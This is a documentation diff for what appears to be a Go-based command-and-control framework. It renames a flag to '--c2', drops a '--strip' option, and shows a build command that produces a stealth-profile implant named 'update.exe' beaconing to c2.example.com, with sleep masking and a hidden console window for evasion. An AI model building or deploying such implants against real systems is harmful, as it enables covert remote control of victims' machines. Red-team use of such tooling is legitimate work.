@@ -86,7 +86,7 @@ These values are baked into the agent binary at compile time via `-ldflags`. Cha
 
 | Flag (generate CLI) | Description |
 |---------------------|-------------|
-| `--server <url>` | C2 server URL the agent connects to |
+| `--c2 <url>` | C2 server URL the agent connects to |
 | `--key <string>` | AES-256 encryption key — must match server `ENCRYPTION_KEY` |
 | `--interval <seconds>` | Beacon interval (default from profile) |
 | `--jitter <percent>` | Jitter percentage applied to interval |
@@ -95,7 +95,6 @@ These values are baked into the agent binary at compile time via `-ldflags`. Cha
 | `--sleep-mask` | Enable VirtualProtect sleep masking |
 | `--profile <name>` | OPSEC profile (default/stealth/aggressive/opsec/paranoid) |
 | `--compress` | Compress output binary |
-| `--strip` | Remove debug symbols (`-s -w`) |
 | `--no-gui` | Hide console window on Windows (`-H windowsgui`) |
 
 ---
@@ -130,10 +129,9 @@ go run ./cmd/server --port 443 --tls-port 443
 
 # Agent build for this server
 go run ./cmd/generate stageless \
-  --server https://c2.example.com \
+  --c2 https://c2.example.com \
   --key $ENCRYPTION_KEY \
   --profile stealth \
-  --strip \
   --no-gui \
   --output ./payload/update.exe
 ```
